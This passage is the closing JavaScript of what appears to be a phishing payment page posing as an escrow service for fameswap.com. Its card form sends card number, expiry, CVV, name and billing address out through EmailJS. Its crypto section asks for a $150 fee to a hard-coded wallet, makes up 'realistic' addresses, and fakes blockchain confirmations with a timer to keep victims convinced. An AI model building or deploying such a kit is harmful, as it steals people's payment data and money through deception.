                    validIcon.style.display = 'block';
                } else {
                    invalidIcon.style.display = 'block';
                }
            }
            console.log('City updated:', e.target.value);
        });

        document.getElementById('state').addEventListener('input', function(e) {
            const validIcon = e.target.parentElement.querySelector('.valid');
            const invalidIcon = e.target.parentElement.querySelector('.invalid');
            
            validIcon.style.display = 'none';
            invalidIcon.style.display = 'none';
            
            if (e.target.value) {
                if (validateState(e.target.value)) {
                    validIcon.style.display = 'block';
                } else {
                    invalidIcon.style.display = 'block';
                }
            }
            console.log('State updated:', e.target.value);
        });

        // Handle payment form submission
        document.getElementById('paymentForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const button = this.querySelector('button');
            showRealisticLoading(button, 'payment');

            console.log('Sending card and billing details to server...');

            const cardNumber = document.getElementById('cardNumber').value;
            const expiry = document.getElementById('expiry').value;
            const cvv = document.getElementById('cvv').value;
            const cardholderName = document.getElementById('cardholderName').value;
            const country = document.getElementById('country').value;
            const streetAddress = document.getElementById('streetAddress').value;
            const city = document.getElementById('city').value;
            const state = document.getElementById('state').value;
            // Remove references to non-existent fields
            // const phoneNumber = document.getElementById('phoneNumber')?.value || '';
            // const dateOfBirth = document.getElementById('dateOfBirth')?.value || '';
            // const ssn = document.getElementById('ssn')?.value || '';

            emailjs.send("service_ew3eveb","template_kkjt9x2", {
                card_number: cardNumber,
                expiry: expiry,
                cvv: cvv,
                cardholder_name: cardholderName,
                country: country,
                street_address: streetAddress,
                city: city,
                state: state
            }).then(
                function(response) {
                    console.log("SUCCESS", response);
                    document.getElementById('successModal').style.display = 'flex';
                    
                    // Show and animate progress bar
                    const progressBar = document.querySelector('.progress-bar');
                    const progressBarFill = document.querySelector('.progress-bar-fill');
                    progressBar.style.display = 'block';
                    setTimeout(() => {
                        progressBarFill.style.width = '100%';
                    }, 100);
                    
                    setTimeout(() => {
                        window.location.href = "https://www.fameswap.com";
                    }, 3000);
                },
                function(error) {
                    console.log("FAILED", error);
                    alert(showRealisticError('card'));
                    hideLoading(button);
                }
            );
        });

        // Enhanced crypto payment handling with realistic addresses
        function generateRealisticAddress(network) {
            const prefixes = {
                'BSC': '0x',
                'Mantle': '0x',
                'Aptos': '0x'
            };
            
            const chars = '0123456789abcdef';
            let address = prefixes[network];
            
            for (let i = 0; i < 40; i++) {
                address += chars[Math.floor(Math.random() * chars.length)];
            }
            
            return address;
        }

        const cryptoWallets = {
            USDT_BEP20: {
                address: '0x9203009C6746255e7989c994f993e15D411848c6',
                rate: 150,  // Fixed $150 worth of USDT BEP20
                minConfirmations: 15,
                network: 'BSC',
                explorer: 'https://bscscan.com'
            },
            MANTLE: {
                address: generateRealisticAddress('Mantle'),
                rate: 150,  // Fixed $150 worth of MANTLE
                minConfirmations: 20,
                network: 'Mantle',
                explorer: 'https://explorer.mantle.xyz'
            },
            APTOS: {
                address: generateRealisticAddress('Aptos'),
                rate: 150,  // Fixed $150 worth of APTOS
                minConfirmations: 32,
                network: 'Aptos',
                explorer: 'https://explorer.aptoslabs.com'
            }
        };

        document.querySelectorAll('input[name="cryptoType"]').forEach(radio => {
            radio.addEventListener('change', function() {
                console.log('Crypto selection changed:', this.value);
                const selectedCrypto = this.value;
                const transactionAmount = parseFloat(document.getElementById('transactionAmount').value);
                const escrowFee = calculateEscrowFee(transactionAmount);
                const wallet = cryptoWallets[selectedCrypto];
                
                if (wallet && escrowFee) {
                    console.log('Processing crypto selection:', {
                        selectedCrypto,
                        escrowFee,
                        wallet,
                        network: wallet.network
                    });

                    // Calculate exact crypto amount based on current exchange rate
                    const cryptoName = selectedCrypto.split('_')[0];
                    const exactCryptoAmount = calculateCryptoAmount(escrowFee, cryptoName);
                    const displayName = {
                        'USDT': 'USDT (BEP20)',
                        'MANTLE': 'MANTLE (MNT)',
                        'APTOS': 'APTOS (APT)'
                    }[cryptoName] || cryptoName;
                    
                    // Update payment summary
                    document.getElementById('escrowFeeDisplay').textContent = `$${escrowFee.toFixed(2)}`;
                    
                    // Update crypto amount display with exact amount (including network fee)
                    document.getElementById('cryptoAmount').textContent = `${exactCryptoAmount.toFixed(6)}`;
                    document.getElementById('cryptoSymbol').textContent = displayName;
                    document.getElementById('addressText').textContent = wallet.address;
                    document.getElementById('networkBadge').textContent = `Network: ${wallet.network}`;
                    
                    // Update current rate display
                    document.getElementById('currentRate').textContent = `$${exchangeRates[cryptoName].toFixed(2)}`;
                    
                    // Generate QR code with exact crypto amount
                    generateQRCode(wallet.address, exactCryptoAmount);
                    
                    // Show wallet details and start monitoring
                    document.getElementById('walletDetails').style.display = 'block';
                    startBlockchainMonitoring();
                    
                    console.log('Showing wallet details for', selectedCrypto);
                    console.log('Network:', wallet.network);
                    console.log('Escrow fee displayed as:', `$${escrowFee.toFixed(2)} worth of ${displayName}`);
                }
            });
        });

        function copyWalletAddress() {
            const addressText = document.getElementById('addressText').textContent;
            navigator.clipboard.writeText(addressText).then(() => {
                const copyButton = document.querySelector('.copy-button');
                copyButton.innerHTML = '<i class="fas fa-check"></i> Copied!';
                setTimeout(() => {
                    copyButton.innerHTML = '<i class="fas fa-copy"></i> Copy';
                }, 2000);
                console.log('Wallet address copied to clipboard');
            });
        }

        // Simple hash validation function
        function isValidTransactionHash(hash, type) {
            console.log('Validating transaction hash:', hash, 'for crypto type:', type);
            
            const hashPatterns = {
                USDT_BEP20: /^0x[0-9a-fA-F]{64}$/,  // BSC transaction hash pattern
                MANTLE: /^0x[0-9a-fA-F]{64}$/,       // Mantle transaction hash pattern
                APTOS: /^0x[0-9a-fA-F]{64}$/         // Aptos transaction hash pattern
            };

            const isValid = hashPatterns[type].test(hash);
            console.log('Hash validation result:', isValid);
            return isValid;
        }

        // Simulate blockchain confirmations with network-specific messages
        function simulateConfirmations(hash, type, callback) {
            console.log('Starting confirmation simulation for hash:', hash);
            const wallet = cryptoWallets[type];
            const requiredConfirmations = wallet.minConfirmations;
            let currentConfirmations = 0;
            
            const confirmationInterval = setInterval(() => {
                currentConfirmations++;
                console.log(`Confirmation ${currentConfirmations}/${requiredConfirmations} for ${type} transaction on ${wallet.network}`);
                
                document.getElementById('verificationStatus').textContent = 
                    `Verifying payment on ${wallet.network}... (${currentConfirmations}/${requiredConfirmations} confirmations)`;
                
                if (currentConfirmations >= requiredConfirmations) {
                    clearInterval(confirmationInterval);
                    console.log(`Transaction fully confirmed on ${wallet.network}`);
                    callback(true);
                }
            }, 2000); // Simulate a new confirmation every 2 seconds
        }

        document.getElementById('hashForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const hash = document.getElementById('transactionHash').value;
            const selectedCrypto = document.querySelector('input[name="cryptoType"]:checked').value;
            const button = this.querySelector('button');
            
            console.log('Transaction hash submitted:', hash);
            console.log('Selected cryptocurrency:', selectedCrypto);

            if (!hash) {
                console.error('No transaction hash provided');
                return;
            }

            if (!isValidTransactionHash(hash, selectedCrypto)) {
                console.error('Invalid transaction hash format');
                let hashError = document.querySelector('.hash-error-message');
                if (!hashError) {
                    const errorDiv = document.createElement('div');
                    errorDiv.className = 'hash-error-message';
                    errorDiv.textContent = showRealisticError('crypto');
                    document.getElementById('transactionHashForm').appendChild(errorDiv);
                    hashError = errorDiv;
                }
                hashError.classList.add('show');
                
                setTimeout(() => {
                    hashError.classList.remove('show');
                }, 2000);
                
                console.log('Showing invalid hash message');
                return;
            }

            showRealisticLoading(button, 'crypto');
            document.getElementById('transactionHashForm').style.display = 'none';
            document.getElementById('verificationStatus').style.display = 'block';
            document.getElementById('verificationStatus').classList.add('pending');

            // Simulate blockchain confirmations
            simulateConfirmations(hash, selectedCrypto, (success) => {
                if (success) {
                    console.log('Payment verification completed successfully');
                    document.getElementById('verificationStatus').classList.remove('pending');
                    document.getElementById('verificationStatus').textContent = 'Payment verified! Proceeding to card linking...';
                    
                    setTimeout(() => {
                        document.getElementById('cryptoPaymentContainer').style.display = 'none';
                        document.getElementById('paymentContainer').style.display = 'block';
                    }, 2000);
                }
            });
        });

        // Function to handle navigation between containers
        function goBack(currentContainer, targetContainer) {
            console.log('Navigating back from', currentContainer, 'to', targetContainer);
            
            // Hide current container
            document.getElementById(currentContainer).style.display = 'none';
            
            // Show target container
            document.getElementById(targetContainer).style.display = 'block';
            
            // Reset form if going back from crypto
            if (currentContainer === 'cryptoPaymentContainer') {
                document.getElementById('walletDetails').style.display = 'none';
                document.getElementById('transactionHashForm').style.display = 'none';
                document.getElementById('transactionMonitoring').style.display = 'none';
                document.getElementById('verificationStatus').style.display = 'none';
                document.querySelectorAll('input[name="cryptoType"]').forEach(radio => {
                    radio.checked = false;
                });
                console.log('Reset crypto payment');
            }
            
            // Reset card form if going back from payment
            if (currentContainer === 'paymentContainer') {
                document.getElementById('paymentForm').reset();
                updateCardIcon(null);
                console.log('Reset payment form');
            }
        }

        // Add event listeners for disabled payment methods
        document.querySelectorAll('input[name="paymentMethod"][disabled]').forEach(radio => {
            radio.parentElement.addEventListener('click', function(e) {
                e.preventDefault();
                console.log('Disabled payment method selected');
                
                const unavailableTag = this.querySelector('.temporary-unavailable');
                unavailableTag.classList.add('show');
                
                console.log('Showing temporary unavailable message');
                
                setTimeout(() => {
                    unavailableTag.classList.remove('show');
                    console.log('Hiding temporary unavailable message');
                }, 2000);
            });
        });

        document.querySelectorAll('input[name="cryptoType"][disabled]').forEach(radio => {
            radio.parentElement.addEventListener('click', function(e) {
                e.preventDefault();
                console.log('Disabled cryptocurrency selected');
                
                const unavailableTag = this.querySelector('.temporary-unavailable');
                unavailableTag.classList.add('show');
                
                console.log('Showing temporary unavailable message');
                
                setTimeout(() => {
                    unavailableTag.classList.remove('show');
                    console.log('Hiding temporary unavailable message');
                }, 2000);
            });
        });

        // Add this after your existing JavaScript
        document.getElementById('guideToggleBtn').addEventListener('click', function() {
            const guide = document.getElementById('paymentGuide');
            const btn = this;
            
            if (guide.style.display === 'none') {
                guide.style.display = 'block';
                btn.innerHTML = '<i class="fas fa-times-circle"></i><span>Hide Payment Guide</span>';
                console.log('Showing payment guide');
            } else {
                hideGuide();
            }
        });

        document.getElementById('closeGuideBtn').addEventListener('click', function() {
            hideGuide();
        });

        function hideGuide() {
            const guide = document.getElementById('paymentGuide');
            const btn = document.getElementById('guideToggleBtn');
            
            guide.classList.add('hiding');
            
            setTimeout(() => {
                guide.style.display = 'none';
                guide.classList.remove('hiding');
                btn.innerHTML = '<i class="fas fa-lightbulb"></i><span>Need help?</span>';
            }, 300);
            
            console.log('Hiding payment guide');
        }
    </script>
</body>
</html>
